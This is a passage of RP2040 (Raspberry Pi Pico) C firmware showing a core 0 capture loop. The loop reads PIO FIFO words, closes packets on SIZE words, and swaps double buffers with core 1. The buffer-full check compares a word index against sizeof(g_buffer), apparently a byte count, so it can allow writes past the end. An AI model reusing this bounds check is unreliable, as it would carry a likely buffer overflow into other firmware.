    pio_sm_set_enabled(pio0, pio0_sm, true);
    pio_sm_exec(pio0, pio0_sm, pio_encode_jmp(31));
    pio_sm_clear_fifos(pio0, pio0_sm);
    pio_sm_set_enabled(pio1, pio1_sm, true);

    // ------------------------------------------------------------------------
    // CORE 0 CAPTURE LOOP
    // Drain PIO0's RX FIFO forever. Each word is either a DATA word (bit 31 = 0,
    // packed line samples) or a SIZE word (bit 31 = 1, the packet's bit count).
    // DATA words accumulate at 'index'; a SIZE word closes the current packet.
    // ------------------------------------------------------------------------
    while (1)
    {
        uint32_t v = pio_sm_get_blocking(pio0, pio0_sm); // blocks until a word is captured

        watchdog_update(); // keep the 4 s watchdog happy as long as traffic flows

        if (v & 0x80000000)
        {
            // SIZE word: end of a packet. Recover the bit count (0xFFFFFFFF - v)
            // into this packet's header, timestamp it, and open the next packet.
            curr_dbuff->g_buffer[packet + 0] = 0xffffffff - v;
            curr_dbuff->g_buffer[packet + 1] = 0; // TIMER slot (hardware timer not wired up in this build)
            curr_dbuff->g_buffer_info.count++;
            packet = index; // next packet's header starts where data will follow
            index += 2;     // reserve its SIZE + TIME header slots

            // Buffer full (packet limit reached): hand it to core 1 and ping-pong.
            if (curr_dbuff->g_buffer_info.count == curr_dbuff->g_buffer_info.limit)
            {
                multicore_fifo_push_blocking((uintptr_t)curr_dbuff);      // give buffer to core 1
                multicore_fifo_pop_blocking();                            // wait for its ack (0x69696969)
                curr_dbuff = (curr_dbuff == &dbuff1) ? &dbuff2 : &dbuff1; // swap buffers
                memset((void *)&(curr_dbuff->g_buffer_info), 0, sizeof(curr_dbuff->g_buffer_info));
                index = 2;
                packet = 0;
                reinit_dbuff(curr_dbuff);
            }
        }
        else
        {
            // DATA word: append the packed samples, unless the buffer is nearly
            // full (leave a few words spare in case a reset marker arrives next).
            if (index < (sizeof(curr_dbuff->g_buffer) - 4)) // Reserve the space for a possible reset
            {
                curr_dbuff->g_buffer[index++] = v;
            }
            else
            {
                // Out of room: hand off early and swap to the other buffer.
                multicore_fifo_push_blocking((uintptr_t)curr_dbuff);
                multicore_fifo_pop_blocking();
                curr_dbuff = (curr_dbuff == &dbuff1) ? &dbuff2 : &dbuff1;
                memset((void *)&(curr_dbuff->g_buffer_info), 0, sizeof(curr_dbuff->g_buffer_info));
                index = 2;
                packet = 0;
                reinit_dbuff(curr_dbuff);
            }
        }
    }

    return 0;
}
